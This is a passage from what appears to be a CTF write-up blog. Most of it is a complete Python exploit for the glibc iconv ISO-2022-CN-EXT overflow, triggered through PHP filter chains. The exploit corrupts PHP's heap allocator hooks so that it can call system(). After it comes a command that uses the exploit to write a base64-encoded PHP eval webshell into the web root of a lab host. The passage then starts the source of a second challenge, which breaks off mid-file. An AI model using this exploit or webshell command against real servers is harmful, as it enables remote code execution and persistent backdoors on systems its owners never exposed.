f.close()<br>        <span class="hljs-comment">#Path(local_path).write(data)</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">find_main_heap</span>(<span class="hljs-params">self, regions: <span class="hljs-built_in">list</span>[Region]</span>) -&gt; Region:<br>        <span class="hljs-comment"># Any anonymous RW region with a size superior to the base heap size is a</span><br>        <span class="hljs-comment"># candidate. The heap is at the bottom of the region.</span><br>        heaps = [<br>            region.stop - HEAP_SIZE + <span class="hljs-number">0x40</span><br>            <span class="hljs-keyword">for</span> region <span class="hljs-keyword">in</span> <span class="hljs-built_in">reversed</span>(regions)<br>            <span class="hljs-keyword">if</span> region.permissions == <span class="hljs-string">&quot;rw-p&quot;</span><br>            <span class="hljs-keyword">and</span> region.size &gt;= HEAP_SIZE<br>            <span class="hljs-keyword">and</span> region.stop &amp; (HEAP_SIZE-<span class="hljs-number">1</span>) == <span class="hljs-number">0</span><br>            <span class="hljs-keyword">and</span> region.path == <span class="hljs-string">&quot;&quot;</span><br>        ]<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> heaps:<br>            failure(<span class="hljs-string">&quot;Unable to find PHP&#x27;s main heap in memory&quot;</span>)<br><br>        first = heaps[<span class="hljs-number">0</span>]<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(heaps) &gt; <span class="hljs-number">1</span>:<br>            heaps = <span class="hljs-string">&quot;, &quot;</span>.join(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">hex</span>, heaps))<br>            msg_info(<span class="hljs-string">f&quot;Potential heaps: [i]<span class="hljs-subst">&#123;heaps&#125;</span>[/] (using first)&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            msg_info(<span class="hljs-string">f&quot;Using [i]<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(first)&#125;</span>[/] as heap&quot;</span>)<br><br>        <span class="hljs-keyword">return</span> first<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-comment">#self.check_vulnerable()</span><br>        <span class="hljs-variable language_">self</span>.get_symbols_and_addresses()<br><br>        <span class="hljs-variable language_">self</span>.exploit()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">build_exploit_path</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">str</span>:<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string">        On each step of the exploit, a filter will process each chunk one after the</span><br><span class="hljs-string">        other. Processing generally involves making some kind of operation either</span><br><span class="hljs-string">        on the chunk or in a destination chunk of the same size. Each operation is</span><br><span class="hljs-string">        applied on every single chunk; you cannot make PHP apply iconv on the first 10</span><br><span class="hljs-string">        chunks and leave the rest in place. That&#x27;s where the difficulties come from.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        Keep in mind that we know the address of the main heap, and the libraries.</span><br><span class="hljs-string">        ASLR/PIE do not matter here.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        The idea is to use the bug to make the freelist for chunks of size 0x100 point</span><br><span class="hljs-string">        lower. For instance, we have the following free list:</span><br><span class="hljs-string"></span><br><span class="hljs-string">        ... -&gt; 0x7fffAABBCC900 -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCCB00</span><br><span class="hljs-string"></span><br><span class="hljs-string">        By triggering the bug from chunk ..900, we get:</span><br><span class="hljs-string"></span><br><span class="hljs-string">        ... -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCCB48 -&gt; ???</span><br><span class="hljs-string"></span><br><span class="hljs-string">        That&#x27;s step 3.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        Now, in order to control the free list, and make it point whereever we want,</span><br><span class="hljs-string">        we need to have previously put a pointer at address 0x7fffAABBCCB48. To do so,</span><br><span class="hljs-string">        we&#x27;d have to have allocated 0x7fffAABBCCB00 and set our pointer at offset 0x48.</span><br><span class="hljs-string">        That&#x27;s step 2.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        Now, if we were to perform step2 an then step3 without anything else, we&#x27;d have</span><br><span class="hljs-string">        a problem: after step2 has been processed, the free list goes bottom-up, like:</span><br><span class="hljs-string"></span><br><span class="hljs-string">        0x7fffAABBCCB00 -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCC900</span><br><span class="hljs-string"></span><br><span class="hljs-string">        We need to go the other way around. That&#x27;s why we have step 1: it just allocates</span><br><span class="hljs-string">        chunks. When they get freed, they reverse the free list. Now step2 allocates in</span><br><span class="hljs-string">        reverse order, and therefore after step2, chunks are in the correct order.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        Another problem comes up.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        To trigger the overflow in step3, we convert from UTF-8 to ISO-2022-CN-EXT.</span><br><span class="hljs-string">        Since step2 creates chunks that contain pointers and pointers are generally not</span><br><span class="hljs-string">        UTF-8, we cannot afford to have that conversion happen on the chunks of step2.</span><br><span class="hljs-string">        To avoid this, we put the chunks in step2 at the very end of the chain, and</span><br><span class="hljs-string">        prefix them with `0\n`. When dechunked (right before the iconv), they will</span><br><span class="hljs-string">        &quot;disappear&quot; from the chain, preserving them from the character set conversion</span><br><span class="hljs-string">        and saving us from an unwanted processing error that would stop the processing</span><br><span class="hljs-string">        chain.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        After step3 we have a corrupted freelist with an arbitrary pointer into it. We</span><br><span class="hljs-string">        don&#x27;t know the precise layout of the heap, but we know that at the top of the</span><br><span class="hljs-string">        heap resides a zend_mm_heap structure. We overwrite this structure in two ways.</span><br><span class="hljs-string">        Its free_slot[] array contains a pointer to each free list. By overwriting it,</span><br><span class="hljs-string">        we can make PHP allocate chunks whereever we want. In addition, its custom_heap</span><br><span class="hljs-string">        field contains pointers to hook functions for emalloc, efree, and erealloc</span><br><span class="hljs-string">        (similarly to malloc_hook, free_hook, etc. in the libc). We overwrite them and</span><br><span class="hljs-string">        then overwrite the use_custom_heap flag to make PHP use these function pointers</span><br><span class="hljs-string">        instead. We can now do our favorite CTF technique and get a call to</span><br><span class="hljs-string">        system(&lt;chunk&gt;).</span><br><span class="hljs-string">        We make sure that the &quot;system&quot; command kills the current process to avoid other</span><br><span class="hljs-string">        system() calls with random chunk data, leading to undefined behaviour.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        The pad blocks just &quot;pad&quot; our allocations so that even if the heap of the</span><br><span class="hljs-string">        process is in a random state, we still get contiguous, in order chunks for our</span><br><span class="hljs-string">        exploit.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        Therefore, the whole process described here CANNOT crash. Everything falls</span><br><span class="hljs-string">        perfectly in place, and nothing can get in the middle of our allocations.</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br><br>        LIBC = <span class="hljs-variable language_">self</span>.info[<span class="hljs-string">&quot;libc&quot;</span>]<br><br>        ADDR_EFREE = LIBC.symbols[<span class="hljs-string">&quot;__libc_system&quot;</span>]<br>        ADDR_EREALLOC = LIBC.symbols[<span class="hljs-string">&quot;__libc_realloc&quot;</span>]<br>        ADDR_EMALLOC = LIBC.symbols[<span class="hljs-string">&quot;__libc_malloc&quot;</span>]<br><br>        ADDR_HEAP = <span class="hljs-variable language_">self</span>.info[<span class="hljs-string">&quot;heap&quot;</span>]<br>        ADDR_FREE_SLOT = ADDR_HEAP + <span class="hljs-number">0x20</span><br>        ADDR_CUSTOM_HEAP = ADDR_HEAP + <span class="hljs-number">0x0168</span><br><br>        ADDR_FAKE_BIN = ADDR_FREE_SLOT - <span class="hljs-number">0x10</span><br><br>        CS = <span class="hljs-number">0x100</span><br><br>        <span class="hljs-comment"># Pad needs to stay at size 0x100 at every step</span><br>        pad_size = CS - <span class="hljs-number">0x18</span><br>        pad = <span class="hljs-string">b&quot;\x00&quot;</span> * pad_size<br>        pad = chunked_chunk(pad, <span class="hljs-built_in">len</span>(pad) + <span class="hljs-number">6</span>)<br>        pad = chunked_chunk(pad, <span class="hljs-built_in">len</span>(pad) + <span class="hljs-number">6</span>)<br>        pad = chunked_chunk(pad, <span class="hljs-built_in">len</span>(pad) + <span class="hljs-number">6</span>)<br>        pad = compressed_bucket(pad)<br><br>        step1_size = <span class="hljs-number">1</span><br>        step1 = <span class="hljs-string">b&quot;\x00&quot;</span> * step1_size<br>        step1 = chunked_chunk(step1)<br>        step1 = chunked_chunk(step1)<br>        step1 = chunked_chunk(step1, CS)<br>        step1 = compressed_bucket(step1)<br><br>        <span class="hljs-comment"># Since these chunks contain non-UTF-8 chars, we cannot let it get converted to</span><br>        <span class="hljs-comment"># ISO-2022-CN-EXT. We add a `0\n` that makes the 4th and last dechunk &quot;crash&quot;</span><br><br>        step2_size = <span class="hljs-number">0x48</span><br>        step2 = <span class="hljs-string">b&quot;\x00&quot;</span> * (step2_size + <span class="hljs-number">8</span>)<br>        step2 = chunked_chunk(step2, CS)<br>        step2 = chunked_chunk(step2)<br>        step2 = compressed_bucket(step2)<br><br>        step2_write_ptr = <span class="hljs-string">b&quot;0\n&quot;</span>.ljust(step2_size, <span class="hljs-string">b&quot;\x00&quot;</span>) + p64(ADDR_FAKE_BIN)<br>        step2_write_ptr = chunked_chunk(step2_write_ptr, CS)<br>        step2_write_ptr = chunked_chunk(step2_write_ptr)<br>        step2_write_ptr = compressed_bucket(step2_write_ptr)<br><br>        step3_size = CS<br><br>        step3 = <span class="hljs-string">b&quot;\x00&quot;</span> * step3_size<br>        <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(step3) == CS<br>        step3 = chunked_chunk(step3)<br>        step3 = chunked_chunk(step3)<br>        step3 = chunked_chunk(step3)<br>        step3 = compressed_bucket(step3)<br><br>        step3_overflow = <span class="hljs-string">b&quot;\x00&quot;</span> * (step3_size - <span class="hljs-built_in">len</span>(BUG)) + BUG<br>        <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(step3_overflow) == CS<br>        step3_overflow = chunked_chunk(step3_overflow)<br>        step3_overflow = chunked_chunk(step3_overflow)<br>        step3_overflow = chunked_chunk(step3_overflow)<br>        step3_overflow = compressed_bucket(step3_overflow)<br><br>        step4_size = CS<br>        step4 = <span class="hljs-string">b&quot;=00&quot;</span> + <span class="hljs-string">b&quot;\x00&quot;</span> * (step4_size - <span class="hljs-number">1</span>)<br>        step4 = chunked_chunk(step4)<br>        step4 = chunked_chunk(step4)<br>        step4 = chunked_chunk(step4)<br>        step4 = compressed_bucket(step4)<br><br>        <span class="hljs-comment"># This chunk will eventually overwrite mm_heap-&gt;free_slot</span><br>        <span class="hljs-comment"># it is actually allocated 0x10 bytes BEFORE it, thus the two filler values</span><br>        step4_pwn = ptr_bucket(<br>            <span class="hljs-number">0x200000</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-comment"># free_slot</span><br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            ADDR_CUSTOM_HEAP,  <span class="hljs-comment"># 0x18</span><br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            ADDR_HEAP,  <span class="hljs-comment"># 0x140</span><br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            size=CS,<br>        )<br><br>        step4_custom_heap = ptr_bucket(<br>            ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=<span class="hljs-number">0x18</span><br>        )<br><br>        step4_use_custom_heap_size = <span class="hljs-number">0x140</span><br><br>        COMMAND = <span class="hljs-variable language_">self</span>.command<br>        COMMAND = <span class="hljs-string">f&quot;kill -9 $PPID; <span class="hljs-subst">&#123;COMMAND&#125;</span>&quot;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.sleep:<br>            COMMAND = <span class="hljs-string">f&quot;sleep <span class="hljs-subst">&#123;self.sleep&#125;</span>; <span class="hljs-subst">&#123;COMMAND&#125;</span>&quot;</span><br>        COMMAND = COMMAND.encode() + <span class="hljs-string">b&quot;\x00&quot;</span><br>        <span class="hljs-built_in">print</span>(COMMAND)<br>        <span class="hljs-keyword">assert</span> (<br>            <span class="hljs-built_in">len</span>(COMMAND) &lt;= step4_use_custom_heap_size<br>        ), <span class="hljs-string">f&quot;Command too big (<span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(COMMAND)&#125;</span>), it must be strictly inferior to <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(step4_use_custom_heap_size)&#125;</span>&quot;</span><br>        COMMAND = COMMAND.ljust(step4_use_custom_heap_size, <span class="hljs-string">b&quot;\x00&quot;</span>)<br><br>        step4_use_custom_heap = COMMAND<br>        step4_use_custom_heap = qpe(step4_use_custom_heap)<br>        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)<br>        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)<br>        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)<br>        step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)<br><br>        pages = (<br>            step4 * <span class="hljs-number">3</span><br>            + step4_pwn<br>            + step4_custom_heap<br>            + step4_use_custom_heap<br>            + step3_overflow<br>            + pad * <span class="hljs-variable language_">self</span>.pad<br>            + step1 * <span class="hljs-number">3</span><br>            + step2_write_ptr<br>            + step2 * <span class="hljs-number">2</span><br>        )<br><br>        resource = compress(compress(pages))<br>        resource = b64(resource)<br>        resource = <span class="hljs-string">f&quot;data:text/plain;base64,<span class="hljs-subst">&#123;resource.decode()&#125;</span>&quot;</span><br><br>        filters = [<br>            <span class="hljs-comment"># Create buckets</span><br>            <span class="hljs-string">&quot;zlib.inflate&quot;</span>,<br>            <span class="hljs-string">&quot;zlib.inflate&quot;</span>,<br>            <br>            <span class="hljs-comment"># Step 0: Setup heap</span><br>            <span class="hljs-string">&quot;dechunk&quot;</span>,<br>            <span class="hljs-string">&quot;convert.iconv.latin1.latin1&quot;</span>,<br>            <br>            <span class="hljs-comment"># Step 1: Reverse FL order</span><br>            <span class="hljs-string">&quot;dechunk&quot;</span>,<br>            <span class="hljs-string">&quot;convert.iconv.latin1.latin1&quot;</span>,<br>            <br>            <span class="hljs-comment"># Step 2: Put fake pointer and make FL order back to normal</span><br>            <span class="hljs-string">&quot;dechunk&quot;</span>,<br>            <span class="hljs-string">&quot;convert.iconv.latin1.latin1&quot;</span>,<br>            <br>            <span class="hljs-comment"># Step 3: Trigger overflow</span><br>            <span class="hljs-string">&quot;dechunk&quot;</span>,<br>            <span class="hljs-string">&quot;convert.iconv.UTF-8.ISO-2022-CN-EXT&quot;</span>,<br>            <br>            <span class="hljs-comment"># Step 4: Allocate at arbitrary address and change zend_mm_heap</span><br>            <span class="hljs-string">&quot;convert.quoted-printable-decode&quot;</span>,<br>            <span class="hljs-string">&quot;convert.iconv.latin1.latin1&quot;</span>,<br>        ]<br>        filters = <span class="hljs-string">&quot;|&quot;</span>.join(filters)<br>        path = <span class="hljs-string">f&quot;uri:php://filter/read=<span class="hljs-subst">&#123;filters&#125;</span>/resource=<span class="hljs-subst">&#123;resource&#125;</span>&quot;</span><br><br>        <span class="hljs-keyword">return</span> path<br><br><span class="hljs-meta">    @inform(<span class="hljs-params"><span class="hljs-string">&quot;Triggering...&quot;</span></span>)</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:<br>        path = <span class="hljs-variable language_">self</span>.build_exploit_path()<br>        start = time.time()<br>        <span class="hljs-built_in">print</span>(path)<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-variable language_">self</span>.remote.send(path)<br>        <span class="hljs-keyword">except</span> (ConnectionError, ChunkedEncodingError):<br>            <span class="hljs-keyword">pass</span><br>        <br>        msg_print()<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-variable language_">self</span>.sleep:<br>            msg_print(<span class="hljs-string">&quot;    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]&quot;</span>)<br>        <span class="hljs-keyword">elif</span> start + <span class="hljs-variable language_">self</span>.sleep &lt;= time.time():<br><br>            msg_print(<span class="hljs-string">&quot;    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># Wrong heap, maybe? If the exploited suggested others, use them!</span><br>            msg_print(<span class="hljs-string">&quot;    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]&quot;</span>)<br>        <span class="hljs-comment">#print(1)</span><br>        msg_print()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">compress</span>(<span class="hljs-params">data</span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;Returns data suitable for `zlib.inflate`.</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># Remove 2-byte header and 4-byte checksum</span><br>    <span class="hljs-keyword">return</span> zlib.compress(data, <span class="hljs-number">9</span>)[<span class="hljs-number">2</span>:-<span class="hljs-number">4</span>]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">b64</span>(<span class="hljs-params">data: <span class="hljs-built_in">bytes</span>, misalign=<span class="hljs-literal">True</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    payload = base64.encode(data)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> misalign <span class="hljs-keyword">and</span> payload.endswith(<span class="hljs-string">&quot;=&quot;</span>):<br>        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">f&quot;Misaligned: <span class="hljs-subst">&#123;data&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> payload.encode()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">compressed_bucket</span>(<span class="hljs-params">data: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;Returns a chunk of size 0x8000 that, when dechunked, returns the data.&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> chunked_chunk(data, <span class="hljs-number">0x8000</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">qpe</span>(<span class="hljs-params">data: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;Emulates quoted-printable-encode.</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-string">f&quot;=<span class="hljs-subst">&#123;x:02x&#125;</span>&quot;</span> <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> data).upper().encode()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ptr_bucket</span>(<span class="hljs-params">*ptrs, size=<span class="hljs-literal">None</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;Creates a 0x8000 chunk that reveals pointers after every step has been ran.&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> size <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(ptrs) * <span class="hljs-number">8</span> == size<br>    bucket = <span class="hljs-string">b&quot;&quot;</span>.join(<span class="hljs-built_in">map</span>(p64, ptrs))<br>    bucket = qpe(bucket)<br>    bucket = chunked_chunk(bucket)<br>    bucket = chunked_chunk(bucket)<br>    bucket = chunked_chunk(bucket)<br>    bucket = compressed_bucket(bucket)<br><br>    <span class="hljs-keyword">return</span> bucket<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">chunked_chunk</span>(<span class="hljs-params">data: <span class="hljs-built_in">bytes</span>, size: <span class="hljs-built_in">int</span> = <span class="hljs-literal">None</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;Constructs a chunked representation of the given chunk. If size is given, the</span><br><span class="hljs-string">    chunked representation has size `size`.</span><br><span class="hljs-string">    For instance, `ABCD` with size 10 becomes: `0004\nABCD\n`.</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># The caller does not care about the size: let&#x27;s just add 8, which is more than</span><br>    <span class="hljs-comment"># enough</span><br>    <span class="hljs-keyword">if</span> size <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        size = <span class="hljs-built_in">len</span>(data) + <span class="hljs-number">8</span><br>    keep = <span class="hljs-built_in">len</span>(data) + <span class="hljs-built_in">len</span>(<span class="hljs-string">b&quot;\n\n&quot;</span>)<br>    size = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(data):x&#125;</span>&quot;</span>.rjust(size - keep, <span class="hljs-string">&quot;0&quot;</span>)<br>    <span class="hljs-keyword">return</span> size.encode() + <span class="hljs-string">b&quot;\n&quot;</span> + data + <span class="hljs-string">b&quot;\n&quot;</span><br><br><br><span class="hljs-meta">@dataclass</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Region</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;A memory region.&quot;&quot;&quot;</span><br><br>    start: <span class="hljs-built_in">int</span><br>    stop: <span class="hljs-built_in">int</span><br>    permissions: <span class="hljs-built_in">str</span><br>    path: <span class="hljs-built_in">str</span><br><br><span class="hljs-meta">    @property</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">size</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">int</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.stop - <span class="hljs-variable language_">self</span>.start<br><br><br>Exploit()<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python cnext-exploit.py http://30.222.0.20:59687/photo.php?pdoceshi <span class="hljs-string">&quot;echo PD9waHAgQGV2YWwoJF9QT1NUWydhdHRhY2snXSk7Pz4=|base64 -d &gt; /var/www/html/shell.php&quot;</span><br></code></pre></td></tr></table></figure><h1 id="maven-packer"><a href="#maven-packer" class="headerlink" title="maven-packer"></a>maven-packer</h1><p>JDK17ã€‚</p><p>hint: </p><ol><li>maven æ’ä»¶ </li><li>å…³æ³¨ Dockerfile </li><li>é¢˜ç›®æœ¬èº«ç¦æ­¢å¯¹å¤–å‘èµ·ä»»ä½•è¿æ¥ </li><li>docker å›½å†…é•œåƒ registry.cn-hangzhou.aliyuncs.com&#x2F;exp10it&#x2F;maven-packer</li></ol><p>IndexController.javaï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.exp10it.ctf;<br><br><span class="hljs-keyword">import</span> net.lingala.zip4j.ZipFile;<br><span class="hljs-keyword">import</span> net.lingala.zip4j.model.FileHeader;<br><span class="hljs-keyword">import</span> net.lingala.zip4j.model.UnzipParameters;<br><span class="hljs-keyword">import</span> net.lingala.zip4j.model.ZipParameters;<br><span class="hljs-keyword">import</span> org.springframework.http.*;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.util.FileSystemUtils;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.*;<br><span class="hljs-keyword">import</span> org.springframework.web.multipart.MultipartFile;<br><br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.Arrays;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IndexController</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">File</span> <span class="hljs-variable">UPLOADS</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;/tmp/uploads&quot;</span>);<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">File</span> <span class="hljs-variable">PROJECTS</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;/tmp/projects&quot;</span>);<br><br>    <span class="hljs-meta">@RequestMapping(&quot;/&quot;)</span><br>    <span class="hljs-keyword">public</span> ResponseEntity&lt;String&gt; <span class="hljs-title function_">index</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResponseEntity</span>&lt;&gt;(<span class="hljs-string">&quot;Hello, World!&quot;</span>, HttpStatus.OK);<br>    &#125;<br><br>    <span class="hljs-meta">@PostMapping(&quot;/pack&quot;)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> ResponseEntity <span class="hljs-title function_">pack</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;file&quot;)</span> MultipartFile uploadFile)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        FileSystemUtils.deleteRecursively(UPLOADS);<br>        FileSystemUtils.deleteRecursively(PROJECTS);<br>        UPLOADS.mkdirs();<br>        PROJECTS.mkdirs();<br><br>        <span class="hljs-type">File</span> <span class="hljs-variable">projectFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(UPLOADS, String.format(<span class="hljs-string">&quot;%s.zip&quot;</span>, RandomUtil.randomStr(<span class="hljs-number">12</span>)));<br>        <span class="hljs-type">File</span> <span class="hljs-variable">projectDir</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(PROJECTS, RandomUtil.randomStr(<span class="hljs-number">12</span>));<br>        uploadFile.transferTo(projectFile);<br><br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">ZipFile</span> <span class="hljs-variable">zipFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZipFile</span>(projectFile)) &#123;<br>            <span class="hljs-type">UnzipParameters</span> <span class="hljs-variable">parameters</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnzipParameters</span>();<br>            parameters.setExtractSymbolicLinks(<span class="hljs-literal">false</span>);<br><br>            <span class="hljs-keyword">for</span> (FileHeader fileHeader : zipFile.getFileHeaders()) &#123;<br>                <span class="hljs-keyword">if</span> (!fileHeader.isDirectory()) &#123;<br>                    <span class="hljs-keyword">try</span> (<span class="hljs-type">InputStream</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> zipFile.getInputStream(fileHeader)) &#123;<br>                        <span class="hljs-type">byte</span>[] data = input.readAllBytes();<br>                        <span class="hljs-keyword">if</span> (!Arrays.equals(<span class="hljs-keyword">new</span> <span class="hljs-title 